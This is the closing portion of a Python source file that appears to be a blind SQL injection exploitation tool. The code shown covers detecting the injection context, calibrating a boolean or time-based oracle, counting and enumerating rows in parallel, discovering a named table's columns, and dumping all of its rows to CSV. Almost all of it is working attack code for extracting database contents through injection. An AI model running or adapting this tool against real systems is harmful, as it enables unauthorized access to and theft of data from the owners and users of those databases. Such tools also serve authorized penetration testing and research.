                raise SystemExit("[!] Couldn't detect context from content. The "
                    "page may be fully blind — use --mode time, or set "
                    "--context / --prefix manually.")
        elif args.mode == "error":
            print("[!] Context auto-detect isn't supported for error mode; "
                  "assuming string escape (').  Use --context if numeric.\n")
            args.esc = "'"
        elif not args.auto:   # time, non-interactive: engine already known
            print("[*] Detecting injection context (time)...")
            if detect_context_time(args) is None:
                raise SystemExit(f"[!] No escape produced a delay for "
                    f"dbms={args.dbms}. Wrong --dbms, or not time-injectable.")
            print()

    if args.auto:
        run_auto(args)
        return

    if getattr(args, "_oracle", None) is None:
        if args.no_calibrate:
            # No calibration -> set a fixed oracle from the flags directly.
            if args.mode == "time":
                thresh = args.delay * 0.8
                args._oracle = lambda r, e: e >= thresh
            elif args.true_marker:
                m = args.true_marker
                args._oracle = lambda r, e: m in r.text
            else:
                p.error("--no-calibrate needs --true-marker for boolean/error "
                        "mode (auto-derived oracles require calibration)")
        else:
            calibrate(args)

    rows = None  # for CSV: list of column-lists

    if args.dump:
        rows = do_dump(args)
    elif args.rows > 0:
        values = collect_rows(args, args.query, args.rows)
        print(f"\n[+] {len(values)} row(s) extracted:")
        for i, v in enumerate(values):
            print(f"    [{i}] {v}")
        rows = [v.split(args.sep) for v in values]
    else:
        val = extract_scalar(args)
        print(f"\n[+] Extracted ({len(val)} chars): {val}")
        rows = [[val]]

    if args.output and rows is not None:
        with open(args.output, "w", newline="", encoding="utf-8") as fh:
            csv.writer(fh).writerows(rows)
        print(f"\n[+] Wrote {len(rows)} row(s) to {args.output}")


def _row_count(args, base_query):
    """Get COUNT(*) of base_query, or None if it can't be determined."""
    cq = f"SELECT COUNT(*) FROM ({base_query}) sqli_cnt"
    try:
        s = extract_value(args, cq)
        digits = "".join(ch for ch in s if ch.isdigit())
        return int(digits) if digits else None
    except Exception:
        return None


def collect_rows(args, base_query, n):
    """Extract up to n rows of base_query, always in parallel. Each row uses a
    single char-worker so total concurrency stays ~--threads (no nested blowup).
    Uses COUNT(*) when available for an exact one-wave fetch; otherwise pulls
    rows in parallel batches, stopping at the first empty row."""
    workers = max(1, args.threads)

    def fetch(i, cw):
        q = f"{base_query} {PAGE[args.dbms].format(i=i)}"
        return extract_value(args, q, workers=cw)

    cnt = _row_count(args, base_query)

    if cnt is not None:
        total = min(cnt, n)
        if total == 0:
            print("[*] 0 rows.")
            return []
        # Split the thread budget: few rows -> more char-workers each.
        cw = max(1, workers // total)
        print(f"[*] {cnt} row(s); extracting {total} in parallel...")
        results = [None] * total
        done = [0]

        def one(i):
            results[i] = fetch(i, cw)
            done[0] += 1
            sys.stdout.write(f"\r      rows {done[0]}/{total}")
            sys.stdout.flush()

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            list(ex.map(one, range(total)))
        print()
        return [r for r in results if r]

    # No COUNT: pull rows in parallel batches; stop at the first empty row.
    print(f"[*] Enumerating in parallel batches (up to {n})...")
    found = []
    i = 0
    while i < n:
        batch = list(range(i, min(i + workers, n)))
        cw = max(1, workers // len(batch))
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            vals = list(ex.map(lambda j: fetch(j, cw), batch))
        stop = False
        for v in vals:
            if v == "":
                stop = True
                break
            found.append(v)
        sys.stdout.write(f"\r      rows {len(found)}")
        sys.stdout.flush()
        if stop:
            break
        i += workers
    print()
    return found


def do_dump(args):
    """Discover a table's columns, then dump all rows as [col, col, ...] lists."""
    table = args.dump
    row_cap = args.rows if args.rows > 0 else 50

    print(f"[*] Discovering columns of '{table}'...\n")
    col_query = COLUMNS_QUERY[args.dbms].format(t=table)
    cols = collect_rows(args, col_query, 100)
    if not cols:
        print("[!] No columns found — check the table name / schema / dbms.")
        return []
    print(f"\n[+] Columns: {', '.join(cols)}\n")

    concat = build_concat(args.dbms, cols, args.sep)
    dump_query = f"SELECT {concat} FROM {table}"
    print(f"[*] Dumping '{table}'...\n")
    values = collect_rows(args, dump_query, row_cap)

    print(f"\n[+] {len(values)} row(s) from '{table}':")
    print("    " + " | ".join(cols))
    for v in values:
        print("    " + v)
    # Header row first so the CSV is self-describing.
    return [cols] + [v.split(args.sep) for v in values]


if __name__ == "__main__":
    main()
